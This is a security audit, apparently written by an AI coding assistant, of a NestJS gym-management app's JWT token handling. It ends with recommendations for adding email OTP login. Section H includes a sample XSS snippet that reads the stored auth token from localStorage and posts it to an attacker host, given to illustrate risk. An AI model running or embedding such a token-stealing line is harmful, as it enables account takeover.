# Authentication & Token Strategy Audit

**Date:** January 30, 2026  
**Purpose:** Pre-Email OTP Implementation Audit  
**System:** Gym Management SaaS Backend (NestJS)

---

## Executive Summary

The authentication system uses **JWT Bearer tokens** (access + refresh) via **Authorization header**. Tokens are **NOT** stored in HTTP-only cookies. The frontend stores tokens in **localStorage** and includes them in API requests via the Authorization header. There is **NO active refresh flow implementation** on the backend (no `/auth/refresh` endpoint).

### Security Risk Summary

- ⚠️ **HIGH:** Tokens in localStorage are vulnerable to XSS attacks
- ⚠️ **MEDIUM:** No refresh token rotation mechanism
- ⚠️ **MEDIUM:** Refresh tokens are issued but never used (dead code)
- ✅ **LOW:** Tokens are properly signed and validated using JWT secrets

---

## A) Current Token Mechanism

### Token Type: **JWT (JSON Web Tokens)**

- **Transport:** Authorization Bearer Header
- **Storage:** Client-side localStorage (key: `gymms_auth`)
- **Cookie Usage:** None

### Token Flow

```
Client                          Backend
  |                               |
  |  POST /auth/login             |
  |  { email, password }          |
  |------------------------------>|
  |                               |
  |                               | ✓ Validate credentials
  |                               | ✓ Check billing status
  |                               | ✓ Sign access + refresh tokens
  |                               |
  |<------------------------------|
  |  { accessToken, refreshToken, |
  |    user: {...}, tenant: {...} }
  |                               |
  |  Store tokens in localStorage |
  |                               |
  |  GET /api/v1/members          |
  |  Authorization: Bearer <token>|
  |------------------------------>|
  |                               |
  |                               | ✓ Extract token from header
  |                               | ✓ Validate JWT signature
  |                               | ✓ Attach payload to request.user
  |                               |
  |<------------------------------|
  |  { data: [...] }              |
```

---

## B) Token Time-to-Live (TTL)

### Access Token

- **Default TTL:** `900s` (15 minutes)
- **Config Key:** `JWT_ACCESS_EXPIRES_IN`
- **Secret Key:** `JWT_ACCESS_SECRET`

### Refresh Token

- **Default TTL:** `30d` (30 days)
- **Config Key:** `JWT_REFRESH_EXPIRES_IN`
- **Secret Key:** `JWT_REFRESH_SECRET`
- **⚠️ Status:** Issued but never consumed (no refresh endpoint exists)

### Configuration

**File:** [backend/docs/ENVIRONMENT_VARIABLES.md](../backend/docs/ENVIRONMENT_VARIABLES.md#L14-L17)

```env
JWT_ACCESS_SECRET="your-production-secret-key"
JWT_REFRESH_SECRET="your-production-refresh-secret-key"
JWT_ACCESS_EXPIRES_IN="900s"   # 15 minutes
JWT_REFRESH_EXPIRES_IN="30d"   # 30 days
```

---

## C) Login Flow Sequence

### 1. Login Request

**Endpoint:** `POST /api/v1/auth/login`  
**Controller:** [backend/src/auth/auth.controller.ts](../backend/src/auth/auth.controller.ts#L35-L58)

```typescript
// Request DTO
{
  email: string;
  password: string;
}
```

**Rate Limiting:**

- **Limit:** 5 attempts per 15 minutes (using ThrottlerGuard)
- **Implementation:** [auth.controller.ts#L37-L38](../backend/src/auth/auth.controller.ts#L37-L38)

### 2. Authentication Logic

**Service:** [backend/src/auth/auth.service.ts](../backend/src/auth/auth.service.ts#L31-L46)

```typescript
async validateUser(email: string, password: string): Promise<User | null> {
  const user = await this.usersRepository.findByEmail(email);
  if (!user) return null;

  const isPasswordValid = await bcrypt.compare(password, user.passwordHash);
  if (!isPasswordValid) return null;

  return user;
}
```

### 3. Token Generation

**Service:** [backend/src/auth/auth.service.ts](../backend/src/auth/auth.service.ts#L48-L107)

```typescript
async login(user: User) {
  // 1. Check tenant billing status
  const tenant = await this.prisma.tenant.findUnique({
    where: { id: user.tenantId }
  });

  // 2. Reject SUSPENDED tenants
  if (tenant.billingStatus === BillingStatus.SUSPENDED) {
    throw new ForbiddenException({
      code: BILLING_ERROR_CODES.TENANT_BILLING_LOCKED,
      message: BILLING_ERROR_MESSAGES.SUSPENDED_LOGIN,
    });
  }

  // 3. Create JWT payload
  const payload: JwtPayload = {
    sub: user.id,
    email: user.email,
    tenantId: user.tenantId,
    role: user.role,
  };

  // 4. Sign access token
  const accessToken = this.jwtService.sign(payload, {
    secret: this.configService.get<string>('JWT_ACCESS_SECRET'),
    expiresIn: '900s', // 15 minutes
  });

  // 5. Sign refresh token
  const refreshToken = this.jwtService.sign(payload, {
    secret: this.configService.get<string>('JWT_REFRESH_SECRET'),
    expiresIn: '30d', // 30 days
  });

  // 6. Return tokens and user data
  return {
    accessToken,
    refreshToken,
    user: { id, email, role, tenantId },
    tenant: { id, name, billingStatus }
  };
}
```

### 4. Login Response Contract

**Type:** [frontend/src/features/auth/types.ts](../frontend/src/features/auth/types.ts#L16)

```typescript
interface LoginResponse {
  accessToken: string;
  refreshToken: string;
  user: {
    id: string;
    email: string;
    role: string;
    tenantId: string;
  };
  tenant: {
    id: string;
    name: string;
    billingStatus: BillingStatus; // ACTIVE | TRIAL | PAST_DUE | SUSPENDED
  };
}
```

### 5. Client-Side Storage

**Implementation:** [frontend/src/features/auth/AuthContext.tsx](../frontend/src/features/auth/AuthContext.tsx#L104-L110)

```typescript
// Store in localStorage
const authData = {
  user: response.user,
  accessToken: response.accessToken,
  refreshToken: response.refreshToken,
  billingStatus: response.tenant.billingStatus,
  billingStatusUpdatedAt: response.tenant.billingStatusUpdatedAt,
};
localStorage.setItem("gymms_auth", JSON.stringify(authData));
```

---

## D) Refresh Flow Sequence

### Current Status: **NOT IMPLEMENTED** ❌

**Findings:**

1. Refresh tokens are generated and returned in login/register responses
2. Refresh tokens are stored in localStorage by the frontend
3. **No `/auth/refresh` endpoint exists** on the backend
4. **No token refresh logic** in frontend (tokens expire after 15 minutes, forcing re-login)

### Dead Code Detected

- Refresh token signing in [auth.service.ts#L89-L92](../backend/src/auth/auth.service.ts#L89-L92)
- Refresh token signing in [auth.service.ts#L325-L328](../backend/src/auth/auth.service.ts#L325-L328) (register flow)
- Refresh token state management in [AuthContext.tsx](../frontend/src/features/auth/AuthContext.tsx)

### Recommended Refresh Flow (Not Currently Implemented)

```
Client                          Backend
  |                               |
  |  POST /auth/refresh           |
  |  { refreshToken }             |
  |------------------------------>|
  |                               |
  |                               | ✓ Verify refresh token signature
  |                               | ✓ Check if token is expired
  |                               | ✓ Validate user still exists
  |                               | ✓ Check billing status
  |                               | ✓ Issue new access token
  |                               | ✓ (Optional) Rotate refresh token
  |                               |
  |<------------------------------|
  |  { accessToken, refreshToken }|
```

---

## E) Token Persistence

### Backend

- **Database Storage:** None
- **In-Memory Storage:** None
- **Session Storage:** None

Tokens are **stateless JWT**. The backend does not store tokens anywhere. Validation is done by verifying the JWT signature and checking the payload.

### Frontend

- **Storage Location:** localStorage
- **Storage Key:** `gymms_auth`
- **Data Shape:**

```typescript
{
  user: AuthUser,
  accessToken: string,
  refreshToken: string,
  billingStatus?: BillingStatus,
  billingStatusUpdatedAt?: string | null
}
```

### Token Attachment to Requests

**File:** [frontend/src/api/client.ts](../frontend/src/api/client.ts#L45-L67)

```typescript
// Request interceptor adds Authorization header
axiosInstance.interceptors.request.use((config) => {
  const authDataStr = localStorage.getItem("gymms_auth");
  if (authDataStr) {
    const authData = JSON.parse(authDataStr);
    const token = authData?.accessToken;
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
  }
  return config;
});
```

---

## F) Token Validation & Guards

### 1. JWT Strategy (Passport)

**File:** [backend/src/auth/strategies/jwt.strategy.ts](../backend/src/auth/strategies/jwt.strategy.ts)

```typescript
@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(private configService: ConfigService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(), // ← Bearer token extraction
      ignoreExpiration: false,
      secretOrKey: configService.get<string>("JWT_ACCESS_SECRET"),
    });
  }

  validate(payload: JwtPayload) {
    if (!payload.sub || !payload.tenantId) {
      throw new UnauthorizedException("Invalid token payload");
    }
    // Attach payload to request.user
    return payload;
  }
}
```

**JWT Payload Structure:**

```typescript
interface JwtPayload {
  sub: string; // user ID
  email: string;
  tenantId: string;
  role: string;
}
```

### 2. Guard Chain (Execution Order)

#### a) JwtAuthGuard (Authentication)

**File:** [backend/src/auth/guards/jwt-auth.guard.ts](../backend/src/auth/guards/jwt-auth.guard.ts)

```typescript
@Injectable()
export class JwtAuthGuard extends AuthGuard("jwt") {}
```

**Purpose:**

- Validates JWT token from Authorization header
- Extracts and verifies signature using `JWT_ACCESS_SECRET`
- Attaches decoded payload to `request.user`

**Usage:**

```typescript
@UseGuards(JwtAuthGuard)
@Get('/protected')
async protectedRoute() { ... }
```

#### b) TenantGuard (Tenant Isolation)

**File:** [backend/src/auth/guards/tenant.guard.ts](../backend/src/auth/guards/tenant.guard.ts)

**Purpose:**

- Ensures user can only access resources within their tenant
- Validates `tenantId` from JWT matches route parameters

**Usage:**

```typescript
@UseGuards(JwtAuthGuard, TenantGuard)
@Controller('api/v1/members')
```

#### c) RolesGuard (Authorization)

**File:** [backend/src/auth/guards/roles.guard.ts](../backend/src/auth/guards/roles.guard.ts#L26-L64)

```typescript
@Injectable()
export class RolesGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<string[]>(
      ROLES_KEY,
      [context.getHandler(), context.getClass()],
    );

    if (!requiredRoles || requiredRoles.length === 0) {
      return true; // No role required
    }

    const user = request.user;
    if (!user || !user.role) {
      throw new ForbiddenException("User role not found");
    }

    return requiredRoles.includes(user.role);
  }
}
```

**Usage:**

```typescript
@UseGuards(JwtAuthGuard, RolesGuard)
@Roles('ADMIN')
@Post('/')
async create() { ... }
```

#### d) BillingStatusGuard (Billing Enforcement) - GLOBAL

**File:** [backend/src/auth/guards/billing-status.guard.ts](../backend/src/auth/guards/billing-status.guard.ts)  
**Registration:** [backend/src/app.module.ts](../backend/src/app.module.ts#L52-L54)

```typescript
{
  provide: APP_GUARD,
  useClass: BillingStatusGuard,
}
```

**Purpose:**

- Blocks API access for SUSPENDED tenants (403 Forbidden)
- Allows read-only access for PAST_DUE tenants
- Runs globally on all routes (after JwtAuthGuard)

**Exclusions:**

- Auth routes (`/api/v1/auth/*`) are excluded using `@SkipBillingStatusCheck()`

### 3. Typical Guard Stack

```
Request → [JwtAuthGuard] → [TenantGuard] → [BillingStatusGuard (global)] → [RolesGuard] → Controller
              ↓               ↓                    ↓                            ↓
         Validates JWT   Validates tenant   Checks billing status      Checks role
         Attaches user   Enforces isolation  Blocks SUSPENDED           ADMIN only
         to request
```

---

## G) Logout Flow

### Current Status: **CLIENT-SIDE ONLY** ⚠️

**No backend logout endpoint exists.** Logout is purely client-side (clearing localStorage).

### Implementation

**File:** [frontend/src/features/auth/AuthContext.tsx](../frontend/src/features/auth/AuthContext.tsx#L260-L270)

```typescript
const logout = useCallback(() => {
  setUser(null);
  setAccessToken(null);
  setRefreshToken(null);
  setBillingStatus(null);
  setBillingStatusUpdatedAt(null);

  // Clear from localStorage
  removeStorageItem(AUTH_STORAGE_KEY);

  // Clear all React Query cache
  queryClient.clear();

  navigate("/login");
}, [navigate]);
```

### Automatic Logout on 401

**File:** [frontend/src/api/client.ts](../frontend/src/api/client.ts#L76-L98)

```typescript
// Response interceptor handles 401 errors
axiosInstance.interceptors.response.use(
  (response) => response,
  (error: AxiosError) => {
    if (error.response?.status === 401) {
      // Clear auth tokens
      localStorage.removeItem("gymms_auth");

      // Dispatch custom event
      window.dispatchEvent(new Event("auth:logout"));

      // Redirect to login
      if (window.location.pathname !== "/login") {
        window.location.href = "/login";
      }
    }
    return Promise.reject(error);
  },
);
```

### Limitations

- **No server-side token revocation:** Since tokens are not stored in the database, there's no way to invalidate a token before it expires
- **JWT tokens remain valid until expiration:** If a token is stolen, it can be used until it expires (15 minutes for access tokens)

---

## H) Security Concerns & Recommendations

### 1. ⚠️ **HIGH PRIORITY: XSS Vulnerability**

**Issue:** Tokens stored in localStorage are vulnerable to XSS attacks.

**Risk:**

```javascript
// Malicious script injected via XSS
const token = localStorage.getItem("gymms_auth");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: token,
});
```

**Recommendation:**

- **Option A (Preferred):** Move to HTTP-only cookies
  - Set `httpOnly: true, secure: true, sameSite: 'strict'`
  - Protects against XSS (JavaScript cannot access cookies)
  - Backend sends `Set-Cookie` header on login
  - Browser automatically includes cookies in requests
- **Option B (Current Approach):** Keep localStorage but mitigate risks
  - Implement strict Content Security Policy (CSP)
  - Sanitize all user inputs to prevent XSS
  - Use short-lived access tokens (current: 15 min ✓)
  - Monitor for suspicious token usage patterns

**For Email OTP:** Use the same token transport mechanism to avoid inconsistency.

---

### 2. ⚠️ **MEDIUM PRIORITY: No Refresh Token Rotation**

**Issue:** Refresh tokens never expire in practice (30 days, but no endpoint to use them).

**Risk:**

- If a refresh token is stolen, attacker has 30 days of access
- No mechanism to detect or revoke compromised refresh tokens

**Recommendation:**

- **Implement `/auth/refresh` endpoint:**
  ```typescript
  @Post('refresh')
  async refresh(@Body() dto: RefreshTokenDto) {
    // 1. Verify refresh token signature
    // 2. Issue new access token
    // 3. (Optional) Issue new refresh token (rotation)
    // 4. (Optional) Store used refresh tokens in DB for one-time use
  }
  ```
- **Implement token rotation:**
  - Issue a new refresh token on each refresh
  - Invalidate the old refresh token
  - Store refresh token hashes in database for revocation

---

### 3. ⚠️ **MEDIUM PRIORITY: Dead Code (Refresh Token)**

**Issue:** Backend generates refresh tokens but never uses them.

**Impact:**

- Wasted computation (signing unused tokens)
- Frontend stores tokens that serve no purpose
- User experience issue: Users must re-login every 15 minutes

**Recommendation:**

- **Option A:** Implement refresh endpoint (see #2)
- **Option B:** Remove refresh token generation entirely if not needed

---

### 4. ✅ **LOW PRIORITY: No Token Revocation**

**Issue:** No backend mechanism to revoke tokens before expiration.

**Impact:**

- If user account is deleted/suspended, their token remains valid until expiration
- If user changes password, old tokens still work

**Recommendation:**

- Implement token blacklist (Redis-based for performance):

  ```typescript
  // On password change, logout, or account suspension
  await redis.setex(`blacklist:${tokenId}`, ttl, "1");

  // In JwtStrategy.validate()
  const isBlacklisted = await redis.exists(`blacklist:${payload.jti}`);
  if (isBlacklisted) {
    throw new UnauthorizedException("Token revoked");
  }
  ```

- **Note:** This requires adding a unique token ID (`jti`) to JWT payload.

---

### 5. ✅ **Positive: Strong JWT Configuration**

**Strengths:**

- Separate secrets for access and refresh tokens ✓
- Short-lived access tokens (15 minutes) ✓
- Tokens signed with HMAC (default `HS256`) ✓
- Proper token validation in JwtStrategy ✓

---

### 6. ⚠️ **MEDIUM PRIORITY: No CSRF Protection**

**Issue:** Using Authorization header mitigates CSRF, but if you move to cookies, CSRF becomes a risk.

**Recommendation:**

- If moving to cookies, implement CSRF tokens:
  ```typescript
  import * as csurf from "csurf";
  app.use(csurf({ cookie: true }));
  ```

---

## I) Key Code Locations

| Component                    | File Path                                                                                             | Lines         |
| ---------------------------- | ----------------------------------------------------------------------------------------------------- | ------------- |
| **Auth Module**              | [backend/src/auth/auth.module.ts](../backend/src/auth/auth.module.ts)                                 | Full file     |
| **Auth Controller**          | [backend/src/auth/auth.controller.ts](../backend/src/auth/auth.controller.ts)                         | Full file     |
| **Auth Service**             | [backend/src/auth/auth.service.ts](../backend/src/auth/auth.service.ts)                               | Full file     |
| **JWT Strategy**             | [backend/src/auth/strategies/jwt.strategy.ts](../backend/src/auth/strategies/jwt.strategy.ts)         | Full file     |
| **JWT Guard**                | [backend/src/auth/guards/jwt-auth.guard.ts](../backend/src/auth/guards/jwt-auth.guard.ts)             | Full file     |
| **Roles Guard**              | [backend/src/auth/guards/roles.guard.ts](../backend/src/auth/guards/roles.guard.ts)                   | Full file     |
| **Tenant Guard**             | [backend/src/auth/guards/tenant.guard.ts](../backend/src/auth/guards/tenant.guard.ts)                 | Full file     |
| **Billing Guard**            | [backend/src/auth/guards/billing-status.guard.ts](../backend/src/auth/guards/billing-status.guard.ts) | Full file     |
| **Login DTO**                | [backend/src/auth/dto/login.dto.ts](../backend/src/auth/dto/login.dto.ts)                             | Full file     |
| **Token Signing (Login)**    | [backend/src/auth/auth.service.ts](../backend/src/auth/auth.service.ts#L84-L92)                       | Lines 84-92   |
| **Token Signing (Register)** | [backend/src/auth/auth.service.ts](../backend/src/auth/auth.service.ts#L320-L328)                     | Lines 320-328 |
| **Frontend Auth Context**    | [frontend/src/features/auth/AuthContext.tsx](../frontend/src/features/auth/AuthContext.tsx)           | Full file     |
| **Frontend API Client**      | [frontend/src/api/client.ts](../frontend/src/api/client.ts)                                           | Full file     |
| **Request Interceptor**      | [frontend/src/api/client.ts](../frontend/src/api/client.ts#L45-L67)                                   | Lines 45-67   |
| **Response Interceptor**     | [frontend/src/api/client.ts](../frontend/src/api/client.ts#L76-L120)                                  | Lines 76-120  |

---

## J) Final Recommendation for Email OTP Integration

### ✅ **Use OTP Integration with Bearer Token + Access-Only Strategy**

**Rationale:**

1. Your current system is Bearer-token-based (Authorization header)
2. Refresh tokens are generated but not used (dead code)
3. Moving to cookies would require significant refactoring

### Recommended OTP Flow

```
┌─────────────────────────────────────────────────────────────┐
│ Email OTP Login Flow (Passwordless)                         │
└─────────────────────────────────────────────────────────────┘

1. POST /api/v1/auth/otp/request
   Request: { email: "user@example.com" }
   Response: { success: true, expiresIn: 300 } // 5 minutes

   Backend:
   - Generate 6-digit OTP (crypto.randomInt)
   - Hash OTP and store in Redis/DB: { email, otpHash, expiresAt }
   - Send OTP via email (SES, SendGrid, etc.)
   - Rate limit: 3 requests per hour per email

2. POST /api/v1/auth/otp/verify
   Request: { email: "user@example.com", otp: "123456" }
   Response: { accessToken, user: {...}, tenant: {...} }

   Backend:
   - Lookup OTP by email
   - Verify OTP hash matches
   - Check expiration
   - Delete OTP from storage (one-time use)
   - Generate JWT access token (same as /auth/login)
   - Return same response contract as /auth/login

3. Frontend stores token in localStorage (same as password login)

4. All subsequent requests use Authorization: Bearer <token>
```

### Implementation Checklist

- [ ] Create `OtpService` for OTP generation/validation
- [ ] Add Redis/DB table for OTP storage:
  ```prisma
  model Otp {
    id        String   @id @default(cuid())
    email     String
    otpHash   String
    expiresAt DateTime
    createdAt DateTime @default(now())
    @@index([email])
  }
  ```
- [ ] Add endpoints: `POST /api/v1/auth/otp/request`, `POST /api/v1/auth/otp/verify`
- [ ] Integrate email service (AWS SES, SendGrid, etc.)
- [ ] Reuse existing token generation logic from `AuthService.login()`
- [ ] Apply same rate limiting as password login (ThrottlerGuard)
- [ ] Add OTP-specific error codes (invalid OTP, expired OTP, etc.)
- [ ] Update frontend to support OTP flow (new login form)

### Security Considerations for OTP

1. **OTP Storage:** Hash OTPs before storing (bcrypt or SHA-256)
2. **Rate Limiting:**
   - 3 OTP requests per hour per email
   - 5 verification attempts per OTP
3. **Expiration:** 5 minutes (configurable)
4. **One-Time Use:** Delete OTP after successful verification
5. **Brute Force Protection:** Lock account after 5 failed attempts
6. **Email Validation:** Ensure user exists before sending OTP

---

## Conclusion

Your current authentication system is functional but has several areas for improvement:

### Strengths

- ✅ Proper JWT validation and signature verification
- ✅ Short-lived access tokens (15 minutes)
- ✅ Multi-layered guard architecture (Auth → Tenant → Billing → Role)
- ✅ Rate limiting on login endpoint
- ✅ Billing status enforcement at authentication level

### Weaknesses

- ⚠️ Tokens stored in localStorage (XSS vulnerability)
- ⚠️ Refresh tokens generated but never used (dead code)
- ⚠️ No token refresh flow (users re-login every 15 minutes)
- ⚠️ No server-side token revocation mechanism
- ⚠️ Client-side-only logout (tokens remain valid until expiration)

### For Email OTP Implementation

**Use the existing Bearer token strategy.** Generate OTPs, verify them, and issue the same JWT access tokens as password login. This maintains consistency with your current architecture and requires minimal changes to the frontend token handling logic.

**Priority:** Consider migrating to HTTP-only cookies post-OTP implementation for better XSS protection.

---

**Audit completed by:** GitHub Copilot  
**Repository:** gym-management-system  
**Backend Framework:** NestJS 11  
**Authentication Library:** @nestjs/jwt + Passport JWT
